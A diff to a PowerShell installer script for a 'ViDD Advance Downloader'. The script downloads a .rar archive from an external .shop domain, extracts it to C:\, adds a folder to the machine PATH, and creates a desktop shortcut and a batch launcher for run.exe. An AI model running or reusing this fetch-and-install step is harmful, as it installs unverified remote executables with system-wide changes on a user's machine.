@@ -13,7 +13,9 @@ $downloadURL = "https://www.api-qsr.shop/vidd_exe.rar"
 $archiveFile = "$env:TEMP\vidd_exe.rar"
 $extractFolder = "C:\vidd_exe"
 $exeName = "run.exe"
+$batName = "run_me.bat"
 $shortcutName = "ViDD Advance Downloader.lnk"
+$iconFile = "$PSScriptRoot\main.icon"  # Assuming the .icon file is in same folder as the script
 
 Write-Host "Downloading file..."
 Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing
@@ -77,12 +79,23 @@ if ($existingPath -notlike "*$finalFolder*") {
     [Environment]::SetEnvironmentVariable("Path", "$existingPath;$finalFolder", "Machine")
 }
 
-# Create desktop shortcut
+# Create run_me.bat file
+Write-Host "Creating run_me.bat file..."
+$batContent = "@echo off`nstart `"$finalFolder\$exeName`""
+Set-Content -Path "$finalFolder\$batName" -Value $batContent -Encoding ASCII
+
+# Create desktop shortcut with custom icon
 Write-Host "Creating desktop shortcut..."
 $WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut([Environment]::GetFolderPath("Desktop") + "\$shortcutName")
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$shortcut = $WshShell.CreateShortcut("$desktopPath\$shortcutName")
 $shortcut.TargetPath = "$finalFolder\$exeName"
 $shortcut.WorkingDirectory = $finalFolder
+if (Test-Path $iconFile) {
+    $shortcut.IconLocation = $iconFile
+} else {
+    Write-Host "Icon file not found. Using default icon."
+}
 $shortcut.Save()
 
 Write-Host "Done!"
